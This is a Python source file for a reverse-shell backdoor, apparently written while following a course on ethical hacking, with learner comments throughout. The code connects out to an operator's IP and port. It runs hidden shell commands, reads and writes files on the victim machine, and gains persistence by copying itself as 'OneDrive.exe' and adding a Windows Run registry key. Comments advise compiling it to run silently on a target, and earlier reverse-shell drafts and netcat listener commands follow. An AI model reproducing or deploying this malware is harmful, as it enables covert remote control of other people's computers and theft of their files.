#!/usr/bin/env python
#needs debugging to work in python3 - bytes-like object error
#compile with --noconsole arg to run silently on target, see line 22

import base64, json, os, shutil, socket, subprocess, sys

#to open listening connection on target computer using netcat:
#nc -vv -l -p 4444
#netcat --veryverbose -listen -port ####

class Backdoor:
    def __init__ (self, ip, port): #constructor method
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
        self.connection.connect((ip, port)) #connect method from connection variable
        
    def become_persistent(self): #establish persistence by copying payload file to another location on target
        payload_file_location = os.environ["appdata"] + "\\OneDrive.exe" #set location to AppData in Windows, rename file to
        #OneDrive.exe
        shutil.copyfile(sys.executable, payload_file_location) #sys.executable specifies executable;
        #if using python file, you'd use __file__
        #copy current payload file to new location
        if not os.path.exists(payload_file_location) #if payload hasn't already been copied
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + payload_file_location + '"', shell=True)      
            #wrap in double quotes so it will run correctly, ie /d "c:\example.exe"
            #import os
            #os.environ["appdata"] - returns location of appdata folder on windows
        
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
        
    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb') #DEVNULL var equals a stream - points to devnull location, OS-agnostic
            #redirecting output to devnull prevents err msgs from displaying on target
            #return subprocess.check_output(command, shell=True)
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
            #redirect stderr and std input to devnull
            #return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) - python3
        except subprocess.CalledProcessError: #catch errors from incorrectly entered commands
            return "[-] Command error, check syntax and try again"
    
    def read_file(self, path):
        with open(path, "rb") as file: #rb - open file for reading as binary
            return base64.b64encode(file.read()) #use base-64 file encoding
            #to be able to handle non-text files (images etc)
    
    def reliable_receive(self):
        json_data = ""
        while True: #loop to execute until entire stream of data is received
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data) #attempt to unpack json converted TCP stream
            except ValueError: #ValueError unterminated string will be received if entire data set is not received
                continue
    
    def reliable_send(self, data):
        #seralise data being sent in order to make sure
        #data arrives intact and pipe doesn't break
        json_data = json.dumps(data) #dumps - method to convert to json object
        self.connection.send(json_data)
    
    def run(self):
        while True:
            #command = self.connection.recv(1024) #receive, specify buffer size
            command = self.reliable_receive() #receive, specify buffer size
            
            try:
                if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
                    #this works because data is sent as json object and unpacked first; receives var command as list
                    self.connection.close()
                    sys.exit() #sys.exit() instead of exit() to avoid error popups on different oses
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command) #specify SELF.function -
                    #need to specify self since calling function from within class
                    #self.connection.send(command_result)
            except Exception: #catch any exception that might happen during above code; prob not good practice
                command_result = "[-] Error during command execution"
                
            self.reliable_send(command_result)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
    
ip = raw_input("Enter IP Address: ")
port = int(raw_input("Enter port number to use: "))
buffer_size = int(raw_input("Enter buffer size: "))

try:
    my_backdoor = Backdoor(ip, port)
    my_backdoor.run()
except Exception: #Exception = any type of error that occurs when trying to run program
    sys.exit() #exit quietly
    





#connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
############################################################################
############################################################################
###Commented code below###
#!/usr/bin/env python

import socket, subprocess

#to open listening connection on target computer using netcat:
#nc -vv -l -p 4444
#netcat --veryverbose -listen -port ####

def execute_system_command(command):
    return subprocess.check_output(command, shell=True) #system command is a shell not a list so shell needs to be set to true
    #subprocess.check_output returns result, need to either store it as a var or return it
    
#python3:
#ip = input("Enter IP Address: ")
#port = input("Enter port number to use: ")
#buffer_size = input("Enter buffer size: ")

ip = raw_input("Enter IP Address: ")
port = int(raw_input("Enter port number to use: "))
buffer_size = int(raw_input("Enter buffer size: "))

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string

while True:
    command = connection.recv(buffer_size) #receive, specify buffer size
    command_result = execute_system_command(command)
    connection.send(command_result)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port



#!/usr/bin/env python3

import socket

connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
#takes two args - 1 - address family, 2 - socket type

ip = input("Enter IP Address: ")
port = input("Enter port number to use: ")
buffersize = input("Enter buffer size: ")

connection.connect((ip, port)) #connect method from connection variable
connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
received_data = connection.recv(buffersize) #receive, specify buffer size
print(received_data)
connection.close()
#connect method takes a tuple
#takes IP and port arguments
#create socket connection from host to target IP and port
